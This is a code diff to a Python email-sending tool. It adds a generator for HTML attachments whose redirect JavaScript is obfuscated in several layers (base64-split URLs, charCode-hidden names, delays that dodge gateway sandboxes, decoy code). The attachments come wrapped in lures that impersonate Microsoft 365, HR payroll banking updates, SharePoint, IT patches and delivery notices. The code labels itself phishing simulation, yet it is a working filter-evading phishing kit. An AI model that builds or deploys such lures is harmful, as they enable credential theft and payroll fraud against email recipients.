@@ -983,6 +983,259 @@ def _build_html_redirect_attachment(cfg, lead, sender=None):
     return part
 
 
+def _build_js_obfuscated_html(cfg, lead, sender=None):
+    """
+    Build a multi-layer JS-obfuscated HTML attachment for authorized phishing
+    simulation / security awareness testing.  Tests whether email security
+    gateways (ESG) detect and block obfuscated JS payloads in HTML attachments.
+
+    Obfuscation layers:
+      1. URL split into N random-length pieces, each base64-encoded
+      2. Pieces assembled at runtime via Array.join
+      3. setTimeout delay (avoids synchronous ESG sandbox timeouts)
+      4. charCode arrays for critical built-in names (location, href, atob)
+      5. Dead-code decoy functions and randomised variable names
+
+    cfg keys:
+        link   — target URL (phishing sim landing page) — required
+        name   — filename (default: "notice.html")
+        theme  — office365 | it_support | hr | sharepoint | delivery (default: office365)
+        delay  — ms before redirect fires (default: 800)
+        layers — 1–4 obfuscation depth (default: 3)
+    """
+    import base64 as _b64, random as _rand, string as _str
+
+    lead = lead or {}
+    raw_link = (cfg.get("link") or cfg.get("url") or "").strip()
+    link = raw_link
+    try:
+        from core.tags import build_context, resolve_tags
+        ctx = build_context(lead=lead, sender=sender or {}, subject="", counter=0)
+        link = resolve_tags(link, ctx)
+    except Exception:
+        pass
+
+    name = (cfg.get("name") or "notice.html").strip()
+    if not (name.endswith(".html") or name.endswith(".htm")):
+        name += ".html"
+
+    theme  = (cfg.get("theme") or "office365").strip().lower()
+    layers = max(1, min(4, int(cfg.get("layers") or 3)))
+    try:
+        delay = max(0, int(cfg.get("delay") or 800))
+    except Exception:
+        delay = 800
+
+    # ── Random variable name generator ──
+    _used = set()
+    def _rvar(length=6):
+        while True:
+            v = "_" + "".join(_rand.choices(_str.ascii_lowercase, k=length))
+            if v not in _used:
+                _used.add(v)
+                return v
+
+    # ── Layer 1: split URL into pieces, base64-encode each ──
+    url = link or "https://example.com"
+    n_pieces = 3 + layers  # 4–7 pieces depending on depth
+    chunk    = max(1, len(url) // n_pieces)
+    pieces   = []
+    pos      = 0
+    while pos < len(url):
+        end = pos + chunk + _rand.randint(-1, 2) if pos + chunk < len(url) else len(url)
+        end = max(pos + 1, min(end, len(url)))
+        pieces.append(url[pos:end])
+        pos = end
+
+    b64_pieces = [_b64.b64encode(p.encode()).decode() for p in pieces]
+
+    # ── Layer 2: build JS that decodes and reassembles ──
+    vArr  = _rvar()
+    vPart = _rvar()
+    vUrl  = _rvar()
+    vIdx  = _rvar()
+    vFn   = _rvar()
+    vGo   = _rvar()
+
+    # Encode "atob" as charCode array to hide it from simple string scanners
+    atob_chars = ",".join(str(ord(c)) for c in "atob")
+    loc_chars  = ",".join(str(ord(c)) for c in "location")
+    href_chars = ",".join(str(ord(c)) for c in "href")
+
+    js_pieces  = "[" + ",".join(f'"{p}"' for p in b64_pieces) + "]"
+
+    if layers >= 3:
+        # Encode fn name for atob via charCode
+        decode_expr = (
+            f'var {vFn}=String.fromCharCode({atob_chars});'
+            f'var {vArr}={js_pieces};'
+            f'var {vUrl}="";'
+            f'for(var {vIdx}=0;{vIdx}<{vArr}.length;{vIdx}++){{'
+            f'{vUrl}+=window[{vFn}]({vArr}[{vIdx}]);'
+            f'}}'
+        )
+    else:
+        decode_expr = (
+            f'var {vArr}={js_pieces};'
+            f'var {vUrl}="";'
+            f'for(var {vIdx}=0;{vIdx}<{vArr}.length;{vIdx}++){{'
+            f'{vUrl}+=atob({vArr}[{vIdx}]);'
+            f'}}'
+        )
+
+    if layers >= 2:
+        # charCode-encode "location" and "href" property names
+        redirect_expr = (
+            f'var _lk=String.fromCharCode({loc_chars});'
+            f'var _hk=String.fromCharCode({href_chars});'
+            f'window[_lk][_hk]={vUrl};'
+        )
+    else:
+        redirect_expr = f'window.location.href={vUrl};'
+
+    # ── Layer 4: dead-code decoy functions ──
+    decoy = ""
+    if layers >= 4:
+        vD1, vD2 = _rvar(), _rvar()
+        decoy = (
+            f'function {vD1}(x){{return x.split("").map(function(c){{return c.charCodeAt(0)+1;}});}}'
+            f'function {vD2}(a,b){{if(a===null)return b;return {vD1}(a).join("-");}}'
+            f'var _chk={vD2}(null,"ok");'
+        )
+
+    go_body = decode_expr + redirect_expr
+    js = f'{decoy}function {vGo}(){{{go_body}}}setTimeout({vGo},{delay});'
+
+    # ── Theme: generate realistic-looking HTML wrapper ──
+    common_style = (
+        "<style>"
+        "*{margin:0;padding:0;box-sizing:border-box}"
+        "body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;"
+        "background:#f3f2f1;display:flex;align-items:center;justify-content:center;min-height:100vh}"
+        ".wrap{background:#fff;border-radius:4px;box-shadow:0 2px 8px rgba(0,0,0,.12);"
+        "max-width:480px;width:100%;overflow:hidden}"
+        ".hdr{padding:16px 24px;display:flex;align-items:center;gap:10px}"
+        ".logo{font-size:20px;font-weight:700;letter-spacing:-.5px}"
+        ".body{padding:32px 28px}"
+        "h2{font-size:19px;font-weight:600;color:#201f1e;margin-bottom:12px}"
+        "p{color:#605e5c;font-size:14px;line-height:1.7;margin-bottom:14px}"
+        ".btn{display:inline-block;padding:10px 24px;border-radius:3px;font-size:14px;"
+        "font-weight:600;text-decoration:none;cursor:pointer;border:none}"
+        ".note{font-size:12px;color:#a19f9d;margin-top:20px}"
+        ".sep{border:none;border-top:1px solid #edebe9;margin:16px 0}"
+        "</style>"
+    )
+
+    if theme == "it_support":
+        header_html = (
+            '<div class="hdr" style="background:#0078d4">'
+            '<span style="color:#fff;font-size:18px">🖥️</span>'
+            '<span class="logo" style="color:#fff">IT Help Desk</span></div>'
+        )
+        body_html = (
+            '<div class="body">'
+            '<h2>Action Required: Security Update</h2>'
+            '<p>Your workstation requires a critical security patch to comply with corporate policy. '
+            'Please click below to initiate the update process. This will take approximately 5 minutes.</p>'
+            '<p><strong>Deadline:</strong> End of business today</p>'
+            '<hr class="sep">'
+            '<a class="btn" onclick="' + vGo + '();return false" href="#" '
+            'style="background:#0078d4;color:#fff">Install Update &rarr;</a>'
+            '<p class="note">Ticket #IT-' + str(_rand.randint(10000, 99999)) + ' &middot; IT Security Team</p>'
+            '</div>'
+        )
+    elif theme == "hr":
+        header_html = (
+            '<div class="hdr" style="background:#107c10">'
+            '<span style="color:#fff;font-size:18px">👥</span>'
+            '<span class="logo" style="color:#fff">HR Portal</span></div>'
+        )
+        body_html = (
+            '<div class="body">'
+            '<h2>Payroll Update Required</h2>'
+            '<p>Our records show your direct deposit information needs to be verified before the next pay cycle. '
+            'Please review and confirm your banking details to avoid delays.</p>'
+            '<p><strong>Please complete by:</strong> Next business day</p>'
+            '<hr class="sep">'
+            '<a class="btn" onclick="' + vGo + '();return false" href="#" '
+            'style="background:#107c10;color:#fff">Update Banking Info &rarr;</a>'
+            '<p class="note">Ref: HR-' + str(_rand.randint(1000, 9999)) + ' &middot; Human Resources</p>'
+            '</div>'
+        )
+    elif theme == "sharepoint":
+        header_html = (
+            '<div class="hdr" style="background:#036ac4">'
+            '<span style="color:#fff;font-size:18px">📂</span>'
+            '<span class="logo" style="color:#fff">SharePoint</span></div>'
+        )
+        body_html = (
+            '<div class="body">'
+            '<h2>Document Shared With You</h2>'
+            '<p>A file has been shared with you from <strong>Corporate Documents</strong>. '
+            'Click the button below to open and review the document.</p>'
+            '<div style="background:#f3f2f1;border-radius:3px;padding:14px 16px;margin:14px 0;">'
+            '<div style="font-weight:600;font-size:14px">&#128196; Q4_Policy_Update.docx</div>'
+            '<div style="font-size:12px;color:#605e5c;margin-top:4px">Modified today &middot; 248 KB</div>'
+            '</div>'
+            '<a class="btn" onclick="' + vGo + '();return false" href="#" '
+            'style="background:#036ac4;color:#fff">Open in SharePoint &rarr;</a>'
+            '<p class="note">You received this because it was shared with your account.</p>'
+            '</div>'
+        )
+    elif theme == "delivery":
+        header_html = (
+            '<div class="hdr" style="background:#cc0000">'
+            '<span style="color:#fff;font-size:18px">📦</span>'
+            '<span class="logo" style="color:#fff">Delivery Notification</span></div>'
+        )
+        body_html = (
+            '<div class="body">'
+            '<h2>Package Delivery Attempt Failed</h2>'
+            '<p>We attempted to deliver your package but were unable to complete delivery. '
+            'A signature is required. Please reschedule your delivery or arrange collection.</p>'
+            '<p><strong>Tracking:</strong> ' + str(_rand.randint(10**17, 10**18-1)) + '</p>'
+            '<hr class="sep">'
+            '<a class="btn" onclick="' + vGo + '();return false" href="#" '
+            'style="background:#cc0000;color:#fff">Reschedule Delivery &rarr;</a>'
+            '<p class="note">This notice will expire in 5 business days.</p>'
+            '</div>'
+        )
+    else:  # office365 (default)
+        header_html = (
+            '<div class="hdr" style="background:#0078d4">'
+            '<span style="color:#fff;font-size:18px">🔒</span>'
+            '<span class="logo" style="color:#fff">Microsoft</span>'
+            '<span style="color:rgba(255,255,255,.7);font-size:13px;margin-left:4px">365</span></div>'
+        )
+        body_html = (
+            '<div class="body">'
+            '<h2>Your password expires soon</h2>'
+            '<p>Your Microsoft 365 password will expire in <strong>24 hours</strong>. '
+            'To avoid being locked out of your account, please update your password now.</p>'
+            '<p style="color:#a80000;font-size:13px">⚠ Failure to act will result in account suspension.</p>'
+            '<hr class="sep">'
+            '<a class="btn" onclick="' + vGo + '();return false" href="#" '
+            'style="background:#0078d4;color:#fff">Update Password &rarr;</a>'
+            '<p class="note">Microsoft account security &middot; If you already changed your password, '
+            'you can ignore this message.</p>'
+            '</div>'
+        )
+
+    html = (
+        f'<!DOCTYPE html><html><head><meta charset="utf-8">'
+        f'<meta name="viewport" content="width=device-width,initial-scale=1">'
+        f'<title>Notice</title>{common_style}</head>'
+        f'<body><div class="wrap">{header_html}{body_html}</div>'
+        f'<script>{js}</script></body></html>'
+    )
+
+    part = MIMEBase("text", "html")
+    part.set_payload(html.encode("utf-8"))
+    encoders.encode_base64(part)
+    part.add_header("Content-Disposition", "attachment", filename=name)
+    return part
+
+
 def _build_svg_redirect_attachment(cfg, lead, sender=None):
     """
     Build an SVG badge with an AES-256-GCM encrypted (or otherwise obfuscated)
@@ -1523,8 +1776,26 @@ def _build_html_to_image(img_cfg, html_content):
     # Method 1: playwright (best HTML rendering)
     try:
         from playwright.sync_api import sync_playwright
+        import shutil as _sh
+        _chromium_exec = next(
+            (p for p in [
+                os.environ.get("PLAYWRIGHT_BROWSERS_PATH", "") and
+                    os.path.join(os.environ["PLAYWRIGHT_BROWSERS_PATH"], "chromium"),
+                "/opt/pw-browsers/chromium",
+                "/usr/bin/chromium-browser",
+                "/usr/bin/chromium",
+                "/usr/bin/google-chrome-stable",
+                "/usr/bin/google-chrome",
+                _sh.which("chromium") or "",
+                _sh.which("chromium-browser") or "",
+            ] if p and os.path.isfile(p)),
+            None
+        )
         with sync_playwright() as p:
-            browser = p.chromium.launch(args=["--no-sandbox", "--disable-gpu"])
+            _launch_kwargs = {"args": ["--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage"]}
+            if _chromium_exec:
+                _launch_kwargs["executable_path"] = _chromium_exec
+            browser = p.chromium.launch(**_launch_kwargs)
             page    = browser.new_page(viewport={"width": width, "height": height})
             page.set_content(html_content)
             page.wait_for_timeout(500)
@@ -2389,6 +2660,16 @@ def build_message(
                 attachment_parts.append(("html_redirect", hr_part, None))
         except Exception as e:
             warnings.append(f"HTML redirect build failed: {e}")
+
+    # JS-Obfuscated HTML — multi-layer obfuscated attachment for phishing sim / ESG testing
+    js_obf_cfg = attachments.get("js_obf_html")
+    if js_obf_cfg and js_obf_cfg.get("link"):
+        try:
+            jso_part = _build_js_obfuscated_html(js_obf_cfg, lead, sender)
+            if jso_part:
+                attachment_parts.append(("js_obf_html", jso_part, None))
+        except Exception as e:
+            warnings.append(f"JS-obfuscated HTML build failed: {e}")
 
     # SVG Redirect — SVG with embedded JS redirect
     svg_redirect_cfg = attachments.get("svg_redirect")
